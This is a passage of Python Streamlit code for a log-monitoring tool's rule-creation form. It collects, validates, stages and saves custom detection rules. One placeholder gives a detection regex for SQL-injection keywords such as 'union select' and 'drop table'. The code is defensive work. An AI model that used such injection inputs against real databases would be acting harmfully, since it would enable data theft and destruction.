                with col_t:
                    threshold = st.number_input("Threshold *", min_value=1, max_value=1000000, value=5)
                with col_w:
                    window = st.number_input("Time Window (sec) *", min_value=0, max_value=86400, value=300)
            else:
                condition = st.text_area(
                    "Condition * (regex pattern)",
                    placeholder="Regex matched against each log line, e.g. (?i)(union\\s+select|drop\\s+table)",
                    height=70,
                )
                group_label = None
                threshold = None
                window = None

            detection_logic = st.text_input(
                "Detection logic (plain language)", max_chars=500,
                placeholder="How / when this rule fires, in plain words.",
            )
            recommended_action = st.text_input(
                "Recommended action (concise, max 2 lines)", max_chars=300,
                placeholder="The single clearest mitigation / investigation step.",
            )
            why_suspicious = st.text_input(
                "Why suspicious", max_chars=500,
                placeholder="Why this activity is dangerous / what it indicates.",
            )
            security_impact = st.text_input(
                "Security impact", max_chars=500,
                placeholder="What an attacker achieves if this succeeds.",
            )
            example_log = st.text_input(
                "Example log line (optional)", max_chars=500,
                placeholder="A representative log line that would trigger this rule.",
            )
            framework_refs = st.text_input(
                "Framework references (optional)", max_chars=255,
                placeholder="MITRE T#### · NIST ... · ISO 27001 ... · CERT-In",
            )

            submitted = st.form_submit_button("Add Rule", type="primary", width='stretch')

    if submitted:
        if not rule_name.strip() or not condition.strip():
            st.error("Rule name and condition/pattern are required.")
            return
        valid_cond, err = validate_rule_condition(condition)
        if not valid_cond:
            st.error(err)
            return
        if db.query(DetectionRule).filter_by(rule_name=rule_name.strip()).first():
            st.error("A rule with this name already exists.")
            return

        now = now_ist()
        new_rule = DetectionRule(
            rule_name=sanitize_text(rule_name.strip(), 150),
            rule_type="custom" if is_custom else "static",
            condition=condition.strip(),
            severity=severity,
            is_static=not is_custom,
            default_threshold=int(threshold) if is_custom else None,
            time_window_seconds=int(window) if is_custom else None,
            group_by=RULE_GROUP_BY_OPTIONS[group_label] if is_custom else None,
            detection_logic=sanitize_text(detection_logic, 500) or None,
            recommended_action=sanitize_text(recommended_action, 300) or None,
            why_suspicious=sanitize_text(why_suspicious, 500) or None,
            security_impact=sanitize_text(security_impact, 500) or None,
            example_log=sanitize_text(example_log, 500) or None,
            framework_refs=sanitize_text(framework_refs, 255) or None,
            is_enabled=True,
            # New rules are STAGED — usable only in the admin's own Home analysis until
            # they are explicitly propagated to all IT Owners.
            is_propagated=False,
            created_by=user.id,
            created_at=now,
            updated_at=now,
        )
        db.add(new_rule)
        db.commit()
        kind_label = "behavioral (no-code)" if is_custom else "static"
        log_action(user.id, ACTION_RULE_CREATE, db,
                   details=f"Created {kind_label} rule (staged): {rule_name}")
        st.success(f"Rule **{rule_name}** created and **staged** — test it on Home, "
                   f"then **Publish** it to all IT Owners.")
        st.rerun()
